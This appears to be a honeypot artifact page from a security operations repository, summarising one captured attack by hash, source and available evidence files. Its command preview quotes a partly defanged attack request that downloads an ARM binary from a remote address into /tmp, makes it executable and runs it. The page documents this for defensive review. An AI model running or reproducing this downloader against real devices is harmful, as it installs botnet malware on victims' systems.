# bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+main_arm+main_arm7+arm7+arm;wget+http:/\/201[.]51[.]13[.]XXX/main_arm7;chmod+777+main_arm7;./main_arm7+je
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
